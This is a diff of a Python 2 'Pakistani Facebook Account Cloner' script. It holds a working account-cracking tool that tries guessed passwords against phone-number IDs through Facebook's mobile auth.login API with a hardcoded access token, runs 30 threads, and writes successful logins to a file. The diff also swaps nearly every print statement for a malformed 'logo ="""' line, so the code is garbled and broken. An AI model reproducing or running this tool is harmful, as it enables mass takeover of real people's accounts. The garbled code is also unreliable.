@@ -13,7 +13,7 @@ for n in range(111111):
     
     sys.stdout = open('.txt', 'a')
 
-    print(nmbr)
+    logo ="""(nmbr)
 
     sys.stdout.flush()
     
@@ -73,7 +73,7 @@ def jalan(z):
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\x1b[1;93mPakistani Facebook Account Cloner█████████████████▒▒▒▒▒▒▒▒.......99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		logo ="""("\r\x1b[1;93mPakistani Facebook Account Cloner█████████████████▒▒▒▒▒▒▒▒.......99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 
 
 back = 0
@@ -92,18 +92,18 @@ logo ="""
 \033[1;95m##  ##   ##     ## ######### ##        ##  ##     ## 
 \033[1;96m##   ##  ##     ## ##     ## ##        ##  ##     ## 
 \033[1;97m##    ## ##     ## ##     ## ######## #### ######## """
-print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-print'\x1b[1;97m ║\x1b[1;96m Made by \x1b[1;96m : \x1b[1;93m Khalid Shaifullah \x1b[1;97m   ║'
-print'\x1b[1;97m ║\x1b[1;96m Facebook \x1b[1;96m     : \x1b[1;93m Khalid Shaifullah \x1b[1;97m   ║'
+logo ="""'\x1b[1;97m ║\x1b[1;96m Made by \x1b[1;96m : \x1b[1;93m Khalid Shaifullah \x1b[1;97m   ║'
+logo ="""'\x1b[1;97m ║\x1b[1;96m Facebook \x1b[1;96m     : \x1b[1;93m Khalid Shaifullah \x1b[1;97m   ║'
 time.sleep(0.05)    
-print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
 time.sleep(0.05)   
-print'                                        '
+logo ="""'                                        '
 jalan("\x1b[1;92mINPUT USERNAME & PASSWORD")
-print 25* '\033[1;96m-'
-print'                                        '
+logo =""" 25* '\033[1;96m-'
+logo ="""'                                        '
 
 CorrectUsername = "Kh@lid"
 CorrectPasscode = "Pak-Cloner"
@@ -112,19 +112,19 @@ loop = 'true'
 while (loop == 'true'):
     username = raw_input("                   \x1b[1;93mINPUT USERNAME \x1b[1;96m: ")
     if (username == CorrectUsername):
-            print """
+            logo =""" """
             \033[1;92m     Username-Correct
                   """
             loop = 'false'
     else:
-            print "\033[1;91m☠️WRONG"
+            logo =""" "\033[1;91m☠️WRONG"
             os.system('xdg-open https://www.facebook.com/khalid.vau.420')
 
 loop = 'true'
 while (loop == 'true'):
     passcode = raw_input("                   \x1b[1;93mINPUT PASSWORD \x1b[1;96m: ")
     if (passcode == CorrectPasscode):
-            print """
+            logo =""" """
             \033[1;92m        Password-Correct
                   """
                   
@@ -132,7 +132,7 @@ while (loop == 'true'):
                  
             loop = 'false'
     else:
-            print "\033[1;91m☠️WRONG"
+            logo =""" "\033[1;91m☠️WRONG"
             os.system('xdg-open https://www.facebook.com/khalid.vau.420')
             
  
@@ -145,19 +145,19 @@ def lisensi():
 ####login#########
 def login():
     os.system('clear')
-    print  """
+    logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-    print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+    logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+    logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-    print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m Khalid Shaifullah  \x1b[1;97m║'
-    print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m Khalid Shaifullah \x1b[1;97m║'
+    logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m Khalid Shaifullah  \x1b[1;97m║'
+    logo ="""'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m Khalid Shaifullah \x1b[1;97m║'
     time.sleep(0.05)    
-    print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-    print '                             '          
+    logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+    logo =""" '                             '          
     
     jalan("\033[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m 7 DIGIT CRACKER")
     time.sleep(0.0005)
@@ -179,7 +179,7 @@ def login():
 def login_pilih():
     peak = raw_input("\n\033[1;96mSelect an Option\x1b[1;97m : ")
     if peak =="":
-        print "\x1b[1;95mFill In Correctly"
+        logo =""" "\x1b[1;95mFill In Correctly"
         login_pilih() 
                     		        
     elif peak =="01":
@@ -228,58 +228,58 @@ def Exit():
         
 def Zeek():
     os.system('clear')
-    print  """
+    logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-    print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+    logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+    logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-    print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah    \x1b[1;97m║'
-    print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
+    logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah    \x1b[1;97m║'
+    logo ="""'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
     time.sleep(0.05)    
-    print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-    print '                                        '
+    logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+    logo =""" '                                        '
     
-    print '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m Jazz'
+    logo =""" '\x1b[1;91m[\x1b[1;93m01\x1b[1;91m]\x1b[1;92m Jazz'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m Zong'
+    logo =""" '\x1b[1;91m[\x1b[1;93m02\x1b[1;91m]\x1b[1;92m Zong'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m Warid'
+    logo =""" '\x1b[1;91m[\x1b[1;93m03\x1b[1;91m]\x1b[1;92m Warid'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m Ufone'
+    logo =""" '\x1b[1;91m[\x1b[1;93m04\x1b[1;91m]\x1b[1;92m Ufone'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m Telenor'
+    logo =""" '\x1b[1;91m[\x1b[1;93m05\x1b[1;91m]\x1b[1;92m Telenor'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m06\x1b[1;91m]\x1b[1;92m Follow Me'
+    logo =""" '\x1b[1;91m[\x1b[1;93m06\x1b[1;91m]\x1b[1;92m Follow Me'
     time.sleep(0.05)
-    print '\x1b[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit'
+    logo =""" '\x1b[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit'
     time.sleep(0.05)    
     action()
     
 def action():
     peak = raw_input('\n\033[1;96mSelect an Option:\033[1;92m')
     if peak =='':
-        print '[!] Fill In Correctly'
+        logo =""" '[!] Fill In Correctly'
         action()
     elif peak =="01":              
         os.system("clear")
-        print  """
+        logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+        logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+        logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
         time.sleep(0.05)    
-        print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-        print '                                        ' 
-        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
-        print'                                                '    
+        logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+        logo =""" '                                        ' 
+        logo =""" " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
+        logo ="""'                                                '    
               
         try:
             c = raw_input("\033[1;96m Select a Number : ")
@@ -290,27 +290,27 @@ def action():
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
         except IOError:
-            print ("[!] File Not Found")
+            logo =""" ("[!] File Not Found")
             raw_input("\n[ Back ]")
             blackmafiax()
          
     elif peak =="02":              
         os.system("clear")
-        print  """
+        logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+        logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+        logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
         time.sleep(0.05)    
-        print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-        print '                                        ' 
-        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
-        print'                                                '    
+        logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+        logo =""" '                                        ' 
+        logo =""" " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
+        logo ="""'                                                '    
               
         try:
             c = raw_input("\033[1;96m Select a Number :")
@@ -319,27 +319,27 @@ def action():
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
         except IOError:
-            print ("[!] File Not Found")
+            logo =""" ("[!] File Not Found")
             raw_input("\n[ Back ]")
             blackmafiax() 
             
     elif peak =="03":              
         os.system("clear")
-        print  """
+        logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+        logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+        logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
         time.sleep(0.05)    
-        print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-        print '                                        ' 
-        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
-        print'                                                '    
+        logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+        logo =""" '                                        ' 
+        logo =""" " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
+        logo ="""'                                                '    
               
         try:
             c = raw_input("\033[1;96m Select a Number :")
@@ -349,27 +349,27 @@ def action():
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
         except IOError:
-            print ("[!] File Not Found")
+            logo =""" ("[!] File Not Found")
             raw_input("\n[ Back ]")
             blackmafiax() 
       
     elif peak =="04":              
         os.system("clear")
-        print  """
+        logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+        logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+        logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah         \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah         \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
         time.sleep(0.05)    
-        print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-        print '                                        ' 
-        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
-        print'                                                '    
+        logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+        logo =""" '                                        ' 
+        logo =""" " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
+        logo ="""'                                                '    
               
         try:
             c = raw_input("\033[1;96m Select a Number :")
@@ -378,27 +378,27 @@ def action():
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
         except IOError:
-            print ("[!] File Not Found")
+            logo =""" ("[!] File Not Found")
             raw_input("\n[ Back ]")
             blackmafiax() 
             
     elif peak =="05":              
         os.system("clear")
-        print  """
+        logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-        print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-        print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+        logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+        logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
+        logo ="""'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
         time.sleep(0.05)    
-        print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-        print '                                        ' 
-        print " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
-        print'                                                '    
+        logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+        logo =""" '                                        ' 
+        logo =""" " 01,45, 44, 33 ,40 ,11 ,24 ,15 ,18 ,36"+'\n'
+        logo ="""'                                                '    
               
         try:
             c = raw_input("\033[1;96m Select a Number :")
@@ -408,7 +408,7 @@ def action():
             for line in open(idlist,"r").readlines():
                 id.append(line.strip())
         except IOError:
-            print ("[!] File Not Found")
+            logo =""" ("[!] File Not Found")
             raw_input("\n[ Back ]")
             blackmafiax() 
             
@@ -423,29 +423,29 @@ def action():
     elif peak =="00":
         login()        
     else:
-        print '[!] Fill In Correctly'
+        logo =""" '[!] Fill In Correctly'
         action()   
     xxx = str(len(id))
     os.system("clear")
-    print  """
+    logo ="""  """
 \x1b[1;93m    ___  ____ _  _  \x1b[1;92m  ____ ____ _  _
 \x1b[1;93m    |__] |__| |_/   \x1b[1;92m  |    |__/ |_/
 \x1b[1;93m    |    |  | | \_  \x1b[1;92m  |___ |  \ | \_
     """
-    print '\x1b[1;96m    Pakistani Facebook Account Cloner'
-    print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
+    logo =""" '\x1b[1;96m    Pakistani Facebook Account Cloner'
+    logo =""" '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-    print'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
-    print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
+    logo ="""'\x1b[1;97m ║\x1b[1;92m Made by  \x1b[1;96m    : \x1b[1;93m  Khalid Shaifullah          \x1b[1;97m║'
+    logo ="""'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/@Khalid114433 \x1b[1;97m║'
     time.sleep(0.05)    
-    print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
-    print'                       '
-    print'                       '
+    logo =""" '\x1b[1;97m ╚═══════════════════════════════════════════╝'
+    logo ="""'                       '
+    logo ="""'                       '
     jalan ('  \x1b[1;91m[\x1b[1;93m✓\x1b[1;91m]\033[1;92m Total ids number: '+xxx)
     jalan ('  \x1b[1;91m[\x1b[1;93m✓\x1b[1;91m]\033[1;92m Process is Starting...')
     jalan ("  \x1b[1;91m[\x1b[1;93m✓\x1b[1;91m]\033[1;92m To Stop Process Press Ctrl+z")
-    print'                                                    '
-    print'\x1b[1;96m ═════════════════════════════════════════════'       
+    logo ="""'                                                    '
+    logo ="""'\x1b[1;96m ═════════════════════════════════════════════'       
     def main(arg):
         global cpb,oks
         user = arg
@@ -458,14 +458,14 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;91m[\x1b[1;92mKHALID-OK\x1b[1;91m]  ' + k + c + user + '  |  ' + pass1                                       
+                logo =""" '\x1b[1;91m[\x1b[1;92mKHALID-OK\x1b[1;91m]  ' + k + c + user + '  |  ' + pass1                                       
                 okb = open('KHALID-CP.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;91m[\x1b[1;96mKHALID-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass1
+                    logo =""" '\033[1;91m[\x1b[1;96mKHALID-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass1
                     cps = open('KHALID-CP.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
@@ -475,14 +475,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;91m[\x1b[1;92mKHALID-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass2
+                        logo =""" '\x1b[1;91m[\x1b[1;92mKHALID-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass2
                         okb = open('KHALID-CP.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;91m[\x1b[1;96mKHALID-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass2
+                            logo =""" '\033[1;91m[\x1b[1;96mKHALID-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass2
                             cps = open('KHALID-CP.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
@@ -492,14 +492,14 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;91m[\x1b[1;92mKHALID-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass3
+                        logo =""" '\x1b[1;91m[\x1b[1;92mKHALID-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass3
                         okb = open('KHALID-CP.txt', 'a')
                         okb.write(k+c+user+pass3+'\n')
                         okb.close()
                         oks.append(c+user+pass3)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
-                            print '\033[1;91m[\x1b[1;96mKHALID-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass3
+                            logo =""" '\033[1;91m[\x1b[1;96mKHALID-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass3
                             cps = open('KHALID-CP.txt', 'a')
                             cps.write(k+c+user+pass3+'\n')
                             cps.close()
@@ -518,13 +518,13 @@ def action():
         
     p = ThreadPool(30)
     p.map(main, id)
-    print 50* '\033[1;91m-'
-    print 'Khalid Shaifullah  Process Has Been Completed██████▒▒▒▒...100%'
-    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
-    print('KHALID:Cloned Accounts Has Been Saved : KHALID-CP.txt')
+    logo =""" 50* '\033[1;91m-'
+    logo =""" 'Khalid Shaifullah  Process Has Been Completed██████▒▒▒▒...100%'
+    logo =""" 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+    logo ="""('KHALID:Cloned Accounts Has Been Saved : KHALID-CP.txt')
 
-    print ''
-    print """
+    logo =""" ''
+    logo =""" """
     
     
     
